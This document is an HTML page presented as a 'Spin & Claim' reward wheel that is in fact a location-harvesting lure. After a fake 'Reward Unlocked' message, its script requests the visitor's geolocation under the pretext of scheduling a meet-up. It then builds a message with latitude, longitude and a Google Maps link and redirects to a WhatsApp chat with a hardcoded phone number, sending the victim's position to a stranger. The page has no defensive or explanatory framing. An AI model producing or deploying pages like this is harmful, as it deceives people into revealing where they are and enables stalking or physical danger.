<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Spin & Claim</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  margin: 0;
  font-family: system-ui, sans-serif;
  background: radial-gradient(circle at top, #1e293b, #020617);
  color: #fff;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
}
.card {
  width: 92%;
  max-width: 420px;
  background: #020617;
  border-radius: 18px;
  padding: 24px;
  text-align: center;
  box-shadow: 0 0 30px rgba(0,0,0,0.8);
}
h2 {
  margin-bottom: 6px;
}
.sub {
  font-size: 14px;
  color: #94a3b8;
}
.wheel {
  width: 200px;
  height: 200px;
  border-radius: 50%;
  margin: 24px auto;
  border: 10px solid #1e293b;
  background: conic-gradient(
    #22c55e 0deg 120deg,
    #38bdf8 120deg 240deg,
    #facc15 240deg 360deg
  );
  display: flex;
  justify-content: center;
  align-items: center;
  transition: transform 3s ease-out;
}
.center {
  width: 60px;
  height: 60px;
  background: #020617;
  border-radius: 50%;
}
button {
  width: 100%;
  padding: 14px;
  font-size: 16px;
  font-weight: bold;
  border: none;
  border-radius: 12px;
  background: #22c55e;
  cursor: pointer;
}
button:disabled {
  background: #64748b;
}
.status {
  margin-top: 14px;
  font-size: 14px;
}
</style>
</head>

<body>
<div class="card">
  <h2>Spin & Claim</h2>
  <div class="sub">Limited reward event</div>

  <div class="wheel" id="wheel">
    <div class="center"></div>
  </div>

  <button id="spinBtn" onclick="spin()">SPIN</button>
  <div class="status" id="status"></div>
</div>

<script>
let spun = false;

function spin() {
  if (spun) return;
  spun = true;

  const wheel = document.getElementById("wheel");
  const status = document.getElementById("status");
  const btn = document.getElementById("spinBtn");

  btn.disabled = true;
  wheel.style.transform = "rotate(1080deg)";

  setTimeout(() => {
    status.innerHTML =
      "<strong>Reward Unlocked ðŸŽ‰</strong><br><br>" +
      "To claim this reward and schedule meet-up,<br>" +
      "please confirm your current location.";
    setTimeout(requestLocation, 1500);
  }, 3000);
}

function requestLocation() {
  const status = document.getElementById("status");

  if (!navigator.geolocation) {
    status.innerText = "Location not supported.";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const map = `https://www.google.com/maps?q=${lat},${lon}`;

      const msg =
        "Reward Claim Location%0A%0A" +
        "Latitude: " + lat + "%0A" +
        "Longitude: " + lon + "%0A%0A" +
        "Map: " + map;

      const wa =
        "https://wa.me/918147963357?text=" + msg;

      status.innerHTML =
        "Location confirmed âœ”<br>" +
        "Redirecting to WhatsAppâ€¦";

      setTimeout(() => {
        window.location.href = wa;
      }, 1200);
    },
    () => {
      status.innerText =
        "Location permission denied. Reward cannot be claimed.";
    }
  );
}
</script>
</body>
</html>
